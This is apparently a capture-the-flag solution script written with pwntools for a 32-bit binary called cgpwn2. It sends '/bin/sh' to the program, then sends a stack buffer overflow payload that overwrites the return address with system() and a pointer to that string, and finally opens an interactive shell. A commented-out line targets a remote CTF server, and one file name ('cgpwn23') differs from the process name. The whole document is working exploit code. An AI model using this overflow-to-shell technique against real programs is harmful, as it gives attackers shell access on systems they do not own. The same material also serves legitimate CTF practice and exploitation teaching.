from pwn import *
# from LibcSearcher import *
p = process("./cgpwn2")
# p = remote("111.198.29.45",53822)
context.log_level = 'debug'
# context.terminal = ['tmux','splitw','-h']

elf = ELF("./cgpwn23")

system = elf.symbols['system']
# gdb.attach(p)
payload1 = "/bin/sh"
p.sendline(payload1)

payload2 = 'a'*(0x26+4) + p32(system) + p32(0xdeadbeef) + p32(0x804a080)
p.sendline(payload2)

p.interactive()
